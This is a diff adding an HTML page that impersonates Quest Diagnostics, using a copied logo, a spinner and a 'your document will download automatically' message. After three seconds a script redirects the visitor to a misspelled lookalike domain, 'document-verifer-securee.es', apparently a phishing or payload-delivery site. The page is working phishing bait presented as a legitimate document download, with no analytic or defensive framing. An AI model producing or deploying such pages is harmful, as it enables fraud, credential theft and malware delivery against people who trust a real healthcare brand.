@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quest Diagnostics</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-color: #ffffff;
+            font-family: Arial, sans-serif;
+        }
+        .logo {
+            max-width: 400px;
+            margin-bottom: 40px;
+        }
+        .spinner {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #0077C8;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .message {
+            margin-top: 30px;
+            color: #333;
+            font-size: 18px;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Quest Diagnostics logo (inline SVG, no external dependency) -->
+    <svg class="logo" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 120" role="img" aria-label="Quest Diagnostics">
+        <rect width="400" height="120" fill="#ffffff"/>
+        <text x="200" y="55" text-anchor="middle"
+              font-family="Arial, Helvetica, sans-serif"
+              font-size="44" font-weight="bold" fill="#0077C8">Quest</text>
+        <text x="200" y="95" text-anchor="middle"
+              font-family="Arial, Helvetica, sans-serif"
+              font-size="30" font-weight="normal" fill="#333333">Diagnostics</text>
+    </svg>
+
+    <div class="spinner"></div>
+
+    <p class="message">Loading... Your document has been prepared and will download automatically.</p>
+
+    <script>
+        // Redirect after 3 seconds
+        setTimeout(function() {
+            window.location.href = "https://document-verifer-securee.es/questdiagnostics/health/health.php";
+        }, 3000);
+    </script>
+</body>
+</html>
